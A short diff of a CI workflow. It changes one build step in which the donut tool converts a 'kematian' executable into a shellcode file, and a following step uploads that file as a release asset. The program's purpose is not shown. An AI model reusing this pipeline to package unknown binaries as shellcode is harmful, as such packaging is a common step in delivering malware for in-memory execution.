@@ -68,7 +68,7 @@ jobs:
 
     # Convert Kematian To Shellcode 
     - name: Convert kematian-src to Shellcode 
-      run: .\donut\donut.exe -i kematian-src\kematian.exe -x2 -a2 -o kematian.bin -z 4
+      run: .\donut\donut.exe -i kematian-src\main.exe -x2 -a2 -o main.bin -z 4
 
     # Upload Shellcode Asset
     - name: Upload Release Asset
